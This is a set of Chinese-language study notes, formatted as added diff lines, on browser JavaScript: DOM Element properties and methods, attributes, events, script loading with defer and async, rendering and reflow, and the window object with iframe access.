+- document.createTreeWalker方法返回一个 DOM 的子树遍历器。它与document.createNodeIterator方法基本是类似的，区别在于它返回的是TreeWalker实例，后者返回的是NodeIterator实例。另外，它的第一个节点不是根节点。
+- document.execCommand()的返回值是一个布尔值。如果为false，表示这个方法无法生效。这个方法大部分情况下，只对选中的内容生效。如果有多个内容可编辑区域，那么只对当前焦点所在的元素生效。
+- document.queryCommandSupported()方法返回一个布尔值，表示浏览器是否支持document.execCommand()的某个命令。
+- document.queryCommandEnabled()方法返回一个布尔值，表示当前是否可用document.execCommand()的某个命令。比如，bold（加粗）命令只有存在文本选中时才可用，如果没有选中文本，就不可用。
+
+### Element节点
+Element节点对象对应网页的 HTML 元素。每一个 HTML 元素，在 DOM 树上都会转化成一个Element节点对象（以下简称元素节点）。Element对象继承了Node接口，因此Node的属性和方法在Element对象都存在。元素节点的nodeType属性都是1。
+
+此外，不同的 HTML 元素对应的元素节点是不一样的，浏览器使用不同的构造函数，生成不同的元素节点，比如`<a>`元素的构造函数是HTMLAnchorElement()，`<button>`是HTMLButtonElement()。因此，元素节点不是一种对象，而是许多种对象，这些对象除了继承Element对象的属性和方法，还有各自独有的属性和方法。
+
+#### 实例属性
+##### 元素特性的相关属性
+- Element.id属性返回指定元素的id属性，该属性可读写。
+- Element.tagName属性返回指定元素的大写标签名，与nodeName属性的值相等。
+- Element.dir属性用于读写当前元素的文字方向，可能是从左到右（"ltr"），也可能是从右到左（"rtl"）。
+- Element.draggable属性返回一个布尔值，表示当前元素是否可拖动。该属性可读写。
+- Element.lang属性返回当前元素的语言设置。该属性可读写。
+- Element.tabIndex属性返回一个整数，表示当前元素在 Tab 键遍历时的顺序。该属性可读写。
+- Element.title属性用来读写当前元素的 HTML 属性title。该属性通常用来指定，鼠标悬浮时弹出的文字提示框。
+
+##### 元素状态的相关属性
+- Element.hidden属性返回一个布尔值，表示当前 HTML 元素的hidden属性的值。该属性可读写，用来控制当前元素是否可见。
+- HTML 元素可以设置contentEditable属性，使得元素的内容可以编辑。
+- Element.attributes属性返回一个类似数组的对象，成员是当前元素节点的所有属性节点。
+- className属性用来读写当前元素节点的class属性。它的值是一个字符串，每个class之间用空格分割。
+- classList属性返回一个类似数组的对象，当前元素节点的每个class就是这个对象的一个成员。
+- Element.dataset属性返回一个对象，可以从这个对象读写data-属性。
+- Element.innerHTML属性返回一个字符串，等同于该元素包含的所有 HTML 代码。该属性可读写，常用来设置某个节点的内容。它能改写所有元素节点的内容，包括`<HTML>`和`<body>`元素。
+- Element.outerHTML属性返回一个字符串，表示当前元素节点的所有 HTML 代码，包括该元素本身和所有子元素。
+- Element.clientHeight属性返回一个整数值，表示元素节点的 CSS 高度（单位像素），只对块级元素生效，对于行内元素返回0。如果块级元素没有设置 CSS 高度，则返回实际高度。除了元素本身的高度，它还包括padding部分，但是不包括border、margin。如果有水平滚动条，还要减去水平滚动条的高度。
+- Element.clientWidth属性返回元素节点的 CSS 宽度，同样只对块级元素有效，也是只包括元素本身的宽度和padding，如果有垂直滚动条，还要减去垂直滚动条的宽度。
+- Element.clientLeft属性等于元素节点左边框（left border）的宽度（单位像素），不包括左侧的padding和margin。如果没有设置左边框，或者是行内元素（display: inline），该属性返回0。该属性总是返回整数值，如果是小数，会四舍五入。
+- Element.clientTop属性等于网页元素顶部边框的宽度（单位像素），其他特点都与clientLeft相同。
+- Element.scrollLeft属性表示当前元素的水平滚动条向右侧滚动的像素数量。
+- Element.scrollTop属性表示当前元素的垂直滚动条向下滚动的像素数量。
+- Element.offsetParent属性返回最靠近当前元素的、并且 CSS 的position属性不等于static的上层元素。
+- Element.offsetHeight属性返回一个整数，表示元素的 CSS 垂直高度（单位像素），包括元素本身的高度、padding 和 border，以及水平滚动条的高度（如果存在滚动条）。
+- Element.offsetWidth属性表示元素的 CSS 水平宽度（单位像素），其他都与Element.offsetHeight一致。
+- Element.offsetLeft返回当前元素左上角相对于Element.offsetParent节点的水平位移。
+- Element.offsetTop返回垂直位移，单位为像素。
+- style用来读写该元素的行内样式信息。
+- Element.children属性返回一个类似数组的对象（HTMLCollection实例），包括当前元素节点的所有子元素。如果当前元素没有子元素，则返回的对象包含零个成员。
+- Element.childElementCount属性返回当前元素节点包含的子元素节点的个数，与Element.children.length的值相同。
+- Element.firstElementChild属性返回当前元素的第一个元素子节点，Element.lastElementChild返回最后一个元素子节点。如果没有元素子节点，这两个属性返回null。
+- Element.nextElementSibling属性返回当前元素节点的后一个同级元素节点，如果没有则返回null。
+- Element.previousElementSibling属性返回当前元素节点的前一个同级元素节点，如果没有则返回null。
+
+#### 实例方法
+- 元素节点提供六个方法，用来操作属性。
+    - getAttribute()：读取某个属性的值
+    - getAttributeNames()：返回当前元素的所有属性名
+    - setAttribute()：写入属性值
+    - hasAttribute()：某个属性是否存在
+    - hasAttributes()：当前元素是否有属性
+    - removeAttribute()：删除属性
+- Element.querySelector方法接受 CSS 选择器作为参数，返回父元素的第一个匹配的子元素。如果没有找到匹配的子元素，就返回null。
+- Element.querySelectorAll方法接受 CSS 选择器作为参数，返回一个NodeList实例，包含所有匹配的子元素。
+- Element.getElementsByClassName方法返回一个HTMLCollection实例，成员是当前元素节点的所有具有指定 class 的子元素节点。该方法与document.getElementsByClassName方法的用法类似，只是搜索范围不是整个文档，而是当前元素节点。
+- Element.getElementsByTagName()方法返回一个HTMLCollection实例，成员是当前节点的所有匹配指定标签名的子元素节点。该方法与document.getElementsByClassName()方法的用法类似，只是搜索范围不是整个文档，而是当前元素节点。
+- Element.closest方法接受一个 CSS 选择器作为参数，返回匹配该选择器的、最接近当前节点的一个祖先节点（包括当前节点本身）。如果没有任何节点匹配 CSS 选择器，则返回null。
+- Element.matches方法返回一个布尔值，表示当前元素是否匹配给定的 CSS 选择器。
+- Element.addEventListener()：添加事件的回调函数
+- Element.removeEventListener()：移除事件监听函数
+- Element.dispatchEvent()：触发事件
+- Element.scrollIntoView方法滚动当前元素，进入浏览器的可见区域，类似于设置window.location.hash的效果。
+- Element.getBoundingClientRect方法返回一个对象，提供当前元素节点的大小、位置等信息，基本上就是 CSS 盒状模型的所有信息。返回的rect对象，具有以下属性（全部为只读）。
+    - x：元素左上角相对于视口的横坐标
+    - y：元素左上角相对于视口的纵坐标
+    - height：元素高度
+    - width：元素宽度
+    - left：元素左上角相对于视口的横坐标，与x属性相等
+    - right：元素右边界相对于视口的横坐标（等于x + width）
+    - top：元素顶部相对于视口的纵坐标，与y属性相等
+    - bottom：元素底部相对于视口的纵坐标（等于y + height）
+- Element.getClientRects方法返回一个类似数组的对象，里面是当前元素在页面上形成的所有矩形（所以方法名中的Rect用的是复数）。每个矩形都有bottom、height、left、right、top和width六个属性，表示它们相对于视口的四个坐标，以及本身的高度和宽度。
+- Element.insertAdjacentElement方法在相对于当前元素的指定位置，插入一个新的节点。该方法返回被插入的节点，如果插入失败，返回null。
+- Element.insertAdjacentHTML方法用于将一个 HTML 字符串，解析生成 DOM 结构，插入相对于当前节点的指定位置。
+- Element.remove方法继承自 ChildNode 接口，用于将当前元素节点从它的父节点移除。
+- Element.focus方法用于将当前页面的焦点，转移到指定元素上。
+- Element.click方法用于在当前元素上模拟一次鼠标点击，相当于触发了click事件。
+
+### 属性的操作
+#### Element.attributes 属性
+元素对象有一个attributes属性，返回一个类似数组的动态对象，成员是该元素标签的所有属性节点对象，属性的实时变化都会反映在这个节点对象上。其他类型的节点对象，虽然也有attributes属性，但返回的都是null，因此可以把这个属性视为元素对象独有的。单个属性可以通过序号引用，也可以通过属性名引用。
+
+属性节点对象有name和value属性，对应该属性的属性名和属性值，等同于nodeName属性和nodeValue属性。
+```js
+// HTML代码为
+// <div id="mydiv">
+var n = document.getElementById('mydiv');
+
+n.attributes[0].name // "id"
+n.attributes[0].nodeName // "id"
+
+n.attributes[0].value // "mydiv"
+n.attributes[0].nodeValue // "mydiv"
+```
+
+#### 元素的标准属性
+HTML 元素的标准属性（即在标准中定义的属性），会自动成为元素节点对象的属性。
+```js
+var a = document.getElementById('test');
+a.id // "test"
+a.href // "http://www.example.com/"
+```
+这种用法虽然可以读写属性，但是无法删除属性，delete运算符在这里不会生效。
+
+#### 属性操作的标准方法
+元素节点提供六个方法，用来操作属性。
+- getAttribute()，方法返回当前元素节点的指定属性。如果指定属性不存在，则返回null。
+- getAttributeNames()，返回一个数组，成员是当前元素的所有属性的名字。如果当前元素没有任何属性，则返回一个空数组。使用Element.attributes属性，也可以拿到同样的结果，唯一的区别是它返回的是类似数组的对象。
+- setAttribute()，用于为当前元素节点新增属性。如果同名属性已存在，则相当于编辑已存在的属性。该方法没有返回值。
+- hasAttribute()，返回一个布尔值，表示当前元素节点是否包含指定属性。
+- hasAttributes()，返回一个布尔值，表示当前元素是否有属性，如果没有任何属性，就返回false，否则返回true。
+- removeAttribute()，移除指定属性。该方法没有返回值。
+
+#### dataset 属性
+使用元素节点对象的dataset属性，它指向一个对象，可以用来操作 HTML 元素标签的data-*属性。
+```js
+<div id="mydiv" data-foo="bar">
+var n = document.getElementById('mydiv');
+n.dataset.foo // bar
+n.dataset.foo = 'baz'
+```
+删除一个data-*属性，可以直接使用delete命令。
+```js
+delete document.getElementById('myDiv').dataset.foo;
+```
+除了dataset属性，也可以用getAttribute('data-foo')、removeAttribute('data-foo')、setAttribute('data-foo')、hasAttribute('data-foo')等方法操作data-*属性。
+
+### CSS操作
+#### CSS伪元素
+CSS 伪元素是通过 CSS 向 DOM 添加的元素，主要是通过:before和:after选择器生成，然后用content属性指定伪元素的内容。
+```js
+<div id="test">Test content</div>
+
+#test:before {
+  content: 'Before ';
+  color: #FF0;
+}
+```
+节点元素的style对象无法读写伪元素的样式，这时就要用到window.getComputedStyle()。JavaScript 获取伪元素，可以使用下面的方法。
+```js
+var test = document.querySelector('#test');
+
+var result = window.getComputedStyle(test, ':before').content;
+var color = window.getComputedStyle(test, ':before').color;
+```
+也可以使用 CSSStyleDeclaration 实例的getPropertyValue方法，获取伪元素的属性。
+```js
+var result = window.getComputedStyle(test, ':before').getPropertyValue('content');
+var color = window.getComputedStyle(test, ':before').getPropertyValue('color');
+```
+
+## 事件
+### EventTarget接口
+DOM 节点的事件操作（监听和触发），都定义在EventTarget接口。所有节点对象都部署了这个接口，其他一些需要事件通信的浏览器内置对象（比如，XMLHttpRequest、AudioNode、AudioContext）也部署了这个接口。
+
+该接口主要提供三个实例方法。
+- addEventListener()：绑定事件的监听函数
+- removeEventListener()：移除事件的监听函数
+- dispatchEvent()：触发事件
+
+#### EventTarget.addEventListener()
+EventTarget.addEventListener()用于在当前节点或对象上（即部署了 EventTarget 接口的对象），定义一个特定事件的监听函数。一旦这个事件发生，就会执行监听函数。该方法没有返回值。
+```js
+target.addEventListener(type, listener[, useCapture]);
+```
+该方法接受三个参数。
+- type：事件名称，大小写敏感。
+- listener：监听函数。事件发生时，会调用该监听函数。
+- useCapture：布尔值，如果设为true，表示监听函数将在捕获阶段（capture）触发。该参数可选，默认值为false（监听函数只在冒泡阶段被触发）。
+
+第三个参数除了布尔值useCapture，还可以是一个监听器配置对象，定制事件监听行为。该对象有以下属性。
+- capture：布尔值，如果设为true，表示监听函数在捕获阶段触发，默认为false，在冒泡阶段触发。
+- once：布尔值，如果设为true，表示监听函数执行一次就会自动移除，后面将不再监听该事件。该属性默认值为false。
+- passive：布尔值，设为true时，表示禁止监听函数调用preventDefault()方法。如果调用了，浏览器将忽略这个要求，并在控制台输出一条警告。该属性默认值为false。
+- signal：该属性的值为一个 AbortSignal 对象，为监听器设置了一个信号通道，用来在需要时发出信号，移除监听函数。
+
+addEventListener()方法可以为针对当前对象的同一个事件，添加多个不同的监听函数。这些函数按照添加顺序触发，即先添加先触发。如果为同一个事件多次添加同一个监听函数，该函数只会执行一次，多余的添加将自动被去除。
+
+如果希望向监听函数传递参数，可以用匿名函数包装一下监听函数。
+```js
+function print(x) {
+  console.log(x);
+}
+
+var el = document.getElementById('div1');
+el.addEventListener('click', function () { print('Hello'); }, false);
+```
+
+监听函数内部的this，指向当前事件所在的那个对象。
+```js
+// HTML 代码如下
+// <p id="para">Hello</p>
+var para = document.getElementById('para');
+para.addEventListener('click', function (e) {
+  console.log(this.nodeName); // "P"
+}, false);
+```
+
+#### EventTarget.removeEventListener()
+EventTarget.removeEventListener()方法用来移除addEventListener()方法添加的事件监听函数。该方法没有返回值。removeEventListener()方法的参数，与addEventListener()方法完全一致。它的第一个参数“事件类型”，大小写敏感。
+```js
+div.addEventListener('click', function (e) {}, false);
+div.removeEventListener('click', function (e) {}, false);
+```
+removeEventListener()方法移除的监听函数，必须是addEventListener()方法添加的那个监听函数，而且必须在同一个元素节点，否则无效。
+
+#### EventTarget.dispatchEvent()
+EventTarget.dispatchEvent()方法在当前节点上触发指定事件，从而触发监听函数的执行。该方法返回一个布尔值，只要有一个监听函数调用了Event.preventDefault()，则返回值为false，否则为true。
+```js
+target.dispatchEvent(event)
+```
+dispatchEvent()方法的参数是一个Event对象的实例。如果dispatchEvent()方法的参数为空，或者不是一个有效的事件对象，将报错。
+
+### Event对象
+事件发生以后，会产生一个事件对象，作为参数传给监听函数。浏览器原生提供一个Event对象，所有的事件都是这个对象的实例，或者说继承了Event.prototype对象。Event对象本身就是一个构造函数，可以用来生成新的实例。
+```js
+event = new Event(type, options);
+```
+Event构造函数接受两个参数。第一个参数type是字符串，表示事件的名称；第二个参数options是一个对象，表示事件对象的配置。该对象主要有下面两个属性。
+- bubbles：布尔值，可选，默认为false，表示事件对象是否冒泡。
+- cancelable：布尔值，可选，默认为false，表示事件是否可以被取消，即能否用Event.preventDefault()取消这个事件。一旦事件被取消，就好像从来没有发生过，不会触发浏览器对该事件的默认行为。
+
+#### Event.preventDefault()
+Event.preventDefault方法取消浏览器对当前事件的默认行为。比如点击链接后，浏览器默认会跳转到另一个页面，使用这个方法以后，就不会跳转了；再比如，按一下空格键，页面向下滚动一段距离，使用这个方法以后也不会滚动了。该方法生效的前提是，事件对象的cancelable属性为true，如果为false，调用该方法没有任何效果。
+
+注意，该方法只是取消事件对当前元素的默认影响，不会阻止事件的传播。如果要阻止传播，可以使用stopPropagation()或stopImmediatePropagation()方法。
+
+#### Event.stopPropagation()
+stopPropagation方法阻止事件在 DOM 中继续传播，防止再触发定义在别的节点上的监听函数，但是不包括在当前节点上其他的事件监听函数。
+
+#### Event.stopImmediatePropagation() 
+Event.stopImmediatePropagation方法阻止同一个事件的其他监听函数被调用，不管监听函数定义在当前节点还是其他节点。也就是说，该方法阻止事件的传播，比Event.stopPropagation()更彻底。
+
+如果同一个节点对于同一个事件指定了多个监听函数，这些函数会根据添加的顺序依次调用。只要其中有一个监听函数调用了Event.stopImmediatePropagation方法，其他的监听函数就不会再执行了。
+
+#### Event.composedPath()
+Event.composedPath()返回一个数组，成员是事件的最底层节点和依次冒泡经过的所有上层节点。
+```js
+// HTML 代码如下
+// <div>
+//   <p>Hello</p>
+// </div>
+var div = document.querySelector('div');
+var p = document.querySelector('p');
+
+div.addEventListener('click', function (e) {
+  console.log(e.composedPath());
+}, false);
+// [p, div, body, html, document, Window]
+```
+
+### 拖拉事件
+draggable属性可用于任何元素节点，但是图片（`<img>`）和链接（`<a>`）不加这个属性，就可以拖拉。对于它们，用到这个属性的时候，往往是将其设为false，防止拖拉这两种元素。
+
+注意，一旦某个元素节点的draggable属性设为true，就无法再用鼠标选中该节点内部的文字或子节点了。
+
+当元素节点或选中的文本被拖拉时，就会持续触发拖拉事件，包括以下一些事件。
+- drag：拖拉过程中，在被拖拉的节点上持续触发（相隔几百毫秒）。
+- dragstart：用户开始拖拉时，在被拖拉的节点上触发，该事件的target属性是被拖拉的节点。通常应该在这个事件的监听函数中，指定拖拉的数据。
+- dragend：拖拉结束时（释放鼠标键或按下 ESC 键）在被拖拉的节点上触发，该事件的target属性是被拖拉的节点。它与dragstart事件，在同一个节点上触发。不管拖拉是否跨窗口，或者中途被取消，dragend事件总是会触发的。
+- dragenter：拖拉进入当前节点时，在当前节点上触发一次，该事件的target属性是当前节点。通常应该在这个事件的监听函数中，指定是否允许在当前节点放下（drop）拖拉的数据。如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。
+- dragover：拖拉到当前节点上方时，在当前节点上持续触发（相隔几百毫秒），该事件的target属性是当前节点。该事件与dragenter事件的区别是，dragenter事件在进入该节点时触发，然后只要没有离开这个节点，dragover事件会持续触发。
+- dragleave：拖拉操作离开当前节点范围时，在当前节点上触发，该事件的target属性是当前节点。如果要在视觉上显示拖拉离开操作当前节点，就在这个事件的监听函数中设置。
+- drop：被拖拉的节点或选中的文本，释放到目标节点时，在目标节点上触发。注意，如果当前节点不允许drop，即使在该节点上方松开鼠标键，也不会触发该事件。如果用户按下 ESC 键，取消这个操作，也不会触发该事件。该事件的监听函数负责取出拖拉数据，并进行相关处理。
+
+## 浏览器模型
+### 代码嵌入网页的方法
+网页中嵌入 JavaScript 代码，主要有四种方法。
+- `<script>`元素直接嵌入代码。
+- `<script>`标签加载外部脚本
+- 事件属性
+- URL 协议
+
+### script 元素
+#### 工作原理
+浏览器加载 JavaScript 脚本，主要通过`<script>`元素完成。正常的网页加载流程是这样的。
+1. 浏览器一边下载 HTML 网页，一边开始解析。也就是说，不等到下载完，就开始解析。
+2. 解析过程中，浏览器发现`<script>`元素，就暂停解析，把网页渲染的控制权转交给 JavaScript 引擎。
+3. 如果`<script>`元素引用了外部脚本，就下载该脚本再执行，否则就直接执行代码。
+4. JavaScript 引擎执行完毕，控制权交还渲染引擎，恢复往下解析 HTML 网页。
+
+加载外部脚本时，浏览器会暂停页面渲染，等待脚本下载并执行完成后，再继续渲染。原因是 JavaScript 代码可以修改 DOM，所以必须把控制权让给它，否则会导致复杂的线程竞赛的问题。
+
+如果外部脚本加载时间很长（一直无法完成下载），那么浏览器就会一直等待脚本下载完成，造成网页长时间失去响应，浏览器就会呈现“假死”状态，这被称为“阻塞效应”。
+
+为了避免这种情况，较好的做法是将`<script>`标签都放在页面底部，而不是头部。这样即使遇到脚本失去响应，网页主体的渲染也已经完成了，用户至少可以看到内容，而不是面对一张空白的页面。如果某些脚本代码非常重要，一定要放在页面头部的话，最好直接将代码写入页面，而不是连接外部脚本文件，这样能缩短加载时间。
+
+脚本文件都放在网页尾部加载，还有一个好处。因为在 DOM 结构生成之前就调用 DOM 节点，JavaScript 会报错，如果脚本都在网页尾部加载，就不存在这个问题，因为这时 DOM 肯定已经生成了。
+
+如果有多个script标签，比如下面这样。
+```js
+<script src="a.js"></script>
+<script src="b.js"></script>
+```
+浏览器会同时并行下载a.js和b.js，但是，执行时会保证先执行a.js，然后再执行b.js，即使后者先下载完成，也是如此。也就是说，脚本的执行顺序由它们在页面中的出现顺序决定，这是为了保证脚本之间的依赖关系不受到破坏。当然，加载这两个脚本都会产生“阻塞效应”，必须等到它们都加载完成，浏览器才会继续页面渲染。
+
+解析和执行 CSS，也会产生阻塞。Firefox 浏览器会等到脚本前面的所有样式表，都下载并解析完，再执行脚本；Webkit则是一旦发现脚本引用了样式，就会暂停执行脚本，等到样式表下载并解析完，再恢复执行。
+
+此外，对于来自同一个域名的资源，比如脚本文件、样式表文件、图片文件等，浏览器一般有限制，同时最多下载6～20个资源，即最多同时打开的 TCP 连接有限制，这是为了防止对服务器造成太大压力。如果是来自不同域名的资源，就没有这个限制。所以，通常把静态文件放在不同的域名之下，以加快下载速度。
+
+#### defer属性
+为了解决脚本文件下载阻塞网页渲染的问题，一个方法是对`<script>`元素加入defer属性。它的作用是延迟脚本的执行，等到 DOM 加载生成后，再执行脚本。
+```js
+<script src="a.js" defer></script>
+<script src="b.js" defer></script>
+```
+上面代码中，只有等到 DOM 加载完成后，才会执行a.js和b.js。
+
+defer属性的运行流程如下。
+1. 浏览器开始解析 HTML 网页。
+2. 解析过程中，发现带有defer属性的`<script>`元素。
+3. 浏览器继续往下解析 HTML 网页，同时并行下载`<script>`元素加载的外部脚本。
+4. 浏览器完成解析 HTML 网页，此时再回过头执行已经下载完成的脚本。
+
+有了defer属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的脚本文件在DOMContentLoaded事件触发前执行（即刚刚读取完`</html>`标签），而且可以保证执行顺序就是它们在页面上出现的顺序。
+
+对于内置而不是加载外部脚本的script标签，以及动态生成的script标签，defer属性不起作用。另外，使用defer加载的外部脚本不应该使用document.write方法。
+
+#### async属性
+```js
+<script src="a.js" async></script>
+<script src="b.js" async></script>
+```
+async属性的作用是，使用另一个进程下载脚本，下载时不会阻塞渲染。
+1. 浏览器开始解析 HTML 网页。
+2. 解析过程中，发现带有async属性的script标签。
+3. 浏览器继续往下解析 HTML 网页，同时并行下载`<script>`标签中的外部脚本。
+4. 脚本下载完成，浏览器暂停解析 HTML 网页，开始执行下载的脚本。
+5. 脚本执行完毕，浏览器恢复解析 HTML 网页。
+
+async属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，就无法保证脚本的执行顺序。哪个脚本先下载结束，就先执行那个脚本。另外，使用async属性的脚本文件里面的代码，不应该使用document.write方法。
+
+一般来说，如果脚本之间没有依赖关系，就使用async属性，如果脚本之间有依赖关系，就使用defer属性。如果同时使用async和defer属性，后者不起作用，浏览器行为由async属性决定。
+
+### 浏览器的组成
+浏览器的核心是两部分：渲染引擎和 JavaScript 解释器（又称 JavaScript 引擎）。
+
+#### 渲染引擎
+渲染引擎的主要作用是，将网页代码渲染为用户视觉可以感知的平面文档。渲染引擎处理网页，通常分成四个阶段。
+1. 解析代码：HTML 代码解析为 DOM，CSS 代码解析为 CSSOM（CSS Object Model）。
+2. 对象合成：将 DOM 和 CSSOM 合成一棵渲染树（render tree）。
+3. 布局：计算出渲染树的布局（layout）。
+4. 绘制：将渲染树绘制到屏幕。
+
+以上四步并非严格按顺序执行，往往第一步还没完成，第二步和第三步就已经开始了。所以，会看到这种情况：网页的 HTML 代码还没下载完，但浏览器已经显示出内容了。
+
+#### 重流和重绘
+渲染树转换为网页布局，称为“布局流”（flow）；布局显示到页面的这个过程，称为“绘制”（paint）。它们都具有阻塞效应，并且会耗费很多时间和计算资源。
+
+页面生成以后，脚本操作和样式表操作，都会触发“重流”（reflow）和“重绘”（repaint）。用户的互动也会触发重流和重绘，比如设置了鼠标悬停（a:hover）效果、页面滚动、在输入框中输入文本、改变窗口大小等等。
+
+重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。
+
+大多数情况下，浏览器会智能判断，将重流和重绘只限制到相关的子树上面，最小化所耗费的代价，而不会全局重新生成网页。
+
+作为开发者，应该尽量设法降低重绘的次数和成本。比如，尽量不要变动高层的 DOM 元素，而以底层 DOM 元素的变动代替；再比如，重绘table布局和flex布局，开销都会比较大。下面是一些优化技巧。
+- 读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。
+- 缓存 DOM 信息。
+- 不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。
+- 使用documentFragment操作 DOM
+- 动画使用absolute定位或fixed定位，这样可以减少对其他元素的影响。
+- 只在必要时才显示隐藏元素。
+- 使用window.requestAnimationFrame()，因为它可以把代码推迟到下一次重绘之前执行，而不是立即要求页面重绘。
+- 使用虚拟 DOM（virtual DOM）库。
+
+#### JavaScript引擎
+JavaScript 引擎的主要作用是，读取网页中的 JavaScript 代码，对其处理后运行。JavaScript 是一种解释型语言，也就是说，它不需要编译，由解释器实时运行。这样的好处是运行和修改都比较方便，刷新页面就可以重新解释；缺点是每次运行都要调用解释器，系统开销较大，运行速度慢于编译型语言。
+
+为了提高运行速度，目前的浏览器都将 JavaScript 进行一定程度的编译，生成类似字节码（bytecode）的中间代码，以提高运行速度。
+
+早期，浏览器内部对 JavaScript 的处理过程如下：
+1. 读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。
+2. 对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。
+3. 使用“翻译器”（translator），将代码转为字节码（bytecode）。
+4. 使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。
+
+逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。
+
+字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，有的 JavaScript 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。
+
+## window 对象
+浏览器里面，window对象（注意，w为小写）指当前的浏览器窗口。它也是当前页面的顶层对象，即最高一层的对象，所有其他对象都是它的下属。一个变量如果未声明，那么默认就是顶层对象的属性。
+
+window有自己的实体含义，其实不适合当作最高一层的顶层对象，这是一个语言的设计失误。最早，设计这门语言的时候，原始设想是语言内置的对象越少越好，这样可以提高浏览器的性能。因此，语言设计者 Brendan Eich 就把window对象当作顶层对象，所有未声明就赋值的变量都自动变成window对象的属性。这种设计使得编译阶段无法检测出未声明变量，但到了今天已经没有办法纠正了。
+
+### window 对象的属性
+- window.name属性是一个字符串，表示当前浏览器窗口的名字。窗口不一定需要名字，这个属性主要配合超链接和表单的target属性使用。
+- window.closed属性返回一个布尔值，表示窗口是否关闭。
+- window.opener属性表示打开当前窗口的父窗口。如果当前窗口没有父窗口（即直接在地址栏输入打开），则返回null。
+- window.self和window.window属性都指向窗口本身。这两个属性只读。
+- window.frames属性返回一个类似数组的对象，成员为页面内所有框架窗口，包括frame元素和iframe元素。window.frames[0]表示页面中第一个框架窗口。
+- window.length属性返回当前网页包含的框架总数。如果当前网页不包含frame和iframe元素，那么window.length就返回0。
+- window.frameElement属性主要用于当前窗口嵌在另一个网页的情况（嵌入`<object>`、`<iframe>`或`<embed>`元素），返回当前窗口所在的那个元素节点。如果当前窗口是顶层窗口，或者所嵌入的那个网页不是同源的，该属性返回null。
+- window.top属性指向最顶层窗口，主要用于在框架窗口（frame）里面获取顶层窗口。
+- window.parent属性指向父窗口。如果当前窗口没有父窗口，window.parent指向自身。
+- window.status属性用于读写浏览器状态栏的文本。但是，现在很多浏览器都不允许改写状态栏文本，所以使用这个方法不一定有效。
+- window.devicePixelRatio属性返回一个数值，表示一个 CSS 像素的大小与一个物理像素的大小之间的比率。也就是说，它表示一个 CSS 像素由多少个物理像素组成。它可以用于判断用户的显示环境，如果这个比率较大，就表示用户正在使用高清屏幕，因此可以显示较大像素的图片。
+
+### window对象的方法
+#### window.requestAnimationFrame()方法
+window.requestAnimationFrame()方法跟setTimeout类似，都是推迟某个函数的执行。不同之处在于，setTimeout必须指定推迟的时间，window.requestAnimationFrame()则是推迟到浏览器下一次重流时执行，执行完才会进行下一次重绘。重绘通常是 16ms 执行一次，不过浏览器会自动调节这个速率，比如网页切换到后台 Tab 页时，requestAnimationFrame()会暂停执行。
+
+如果某个函数会改变网页的布局，一般就放在window.requestAnimationFrame()里面执行，这样可以节省系统资源，使得网页效果更加平滑。因为慢速设备会用较慢的速率重流和重绘，而速度更快的设备会有更快的速率。
+
+该方法接受一个回调函数作为参数。
+```js
+window.requestAnimationFrame(callback);
+```
+window.requestAnimationFrame()的返回值是一个整数，这个整数可以传入window.cancelAnimationFrame()，用来取消回调函数的执行。
+
+#### window.requestIdleCallback()方法
+window.requestIdleCallback()跟setTimeout类似，也是将某个函数推迟执行，但是它保证将回调函数推迟到系统资源空闲时执行。也就是说，如果某个任务不是很关键，就可以使用window.requestIdleCallback()将其推迟执行，以保证网页性能。
+
+它跟window.requestAnimationFrame()的区别在于，后者指定回调函数在下一次浏览器重排时执行，问题在于下一次重排时，系统资源未必空闲，不一定能保证在16毫秒之内完成；window.requestIdleCallback()可以保证回调函数在系统资源空闲时执行。
+
+该方法接受一个回调函数和一个配置对象作为参数。配置对象可以指定一个推迟执行的最长时间，如果过了这个时间，回调函数不管系统资源有无空闲，都会执行。
+```js
+window.requestIdleCallback(callback[, options])
+```
+callback参数是一个回调函数。该回调函数执行时，系统会传入一个IdleDeadline对象作为参数。IdleDeadline对象有一个didTimeout属性（布尔值，表示是否为超时调用）和一个timeRemaining()方法（返回该空闲时段剩余的毫秒数）。
+
+options参数是一个配置对象，目前只有timeout一个属性，用来指定回调函数推迟执行的最大毫秒数。该参数可选。
+
+window.requestIdleCallback()方法返回一个整数。该整数可以传入window.cancelIdleCallback()取消回调函数。
+
+### 多窗口操作
+#### iframe元素
+对于iframe嵌入的窗口，document.getElementById方法可以拿到该窗口的 DOM 节点，然后使用contentWindow属性获得iframe节点包含的window对象。
+```js
+var frame = document.getElementById('theFrame');
+var frameWindow = frame.contentWindow;
+```
+`<iframe>`元素的contentDocument属性，可以拿到子窗口的document对象。
+```js
+var frame = document.getElementById('theFrame');
+var frameDoc = frame.contentDocument;
+
+// 等同于
+var frameDoc = frame.contentWindow.document;
+```
+`<iframe>`元素遵守同源政策，只有当父窗口与子窗口在同一个域时，两者之间才可以用脚本通信，否则只有使用window.postMessage方法。
+
+`<iframe>`窗口内部，使用window.parent引用父窗口。如果当前页面没有父窗口，则window.parent属性返回自身。因此，可以通过window.parent是否等于window.self，判断当前窗口是否为iframe窗口。
+
+`<iframe>`窗口的window对象，有一个frameElement属性，返回`<iframe>`在父窗口中的 DOM 节点。对于非嵌入的窗口，该属性等于null。
